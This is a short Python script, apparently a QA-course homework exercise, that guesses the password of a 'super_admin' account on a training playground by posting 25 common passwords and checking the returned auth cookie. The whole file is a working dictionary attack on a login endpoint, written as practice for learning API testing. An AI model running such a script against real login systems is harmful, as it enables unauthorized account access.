import requests

most_popular_passwords = ['123456','123456789','qwerty','password','1234567','12345678','12345','iloveyou','111111','123123','abc123','qwerty123','1q2w3e4r','admin','qwertyuiop','654321','555555','lovely','7777777','welcome','888888','princess','dragon','password1','123qwe']
password_is_found = False
i = 0
print('Идет подбор пароля...')
while not password_is_found and i < len(most_popular_passwords):
    password = most_popular_passwords[i]
    response = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data={"login": 'super_admin', "password": password})
    cookie = response.cookies.get('auth_cookie')
    response1 = requests.post("https://playground.learnqa.ru/ajax/api/check_auth_cookie", cookies={"auth_cookie": cookie})
    if response1.text != 'You are NOT authorized':
        print(response1.text)
        print('Правильный пароль:', password)
        password_is_found = True
    i += 1
if not password_is_found:
    print('Пароль не удалось подобрать')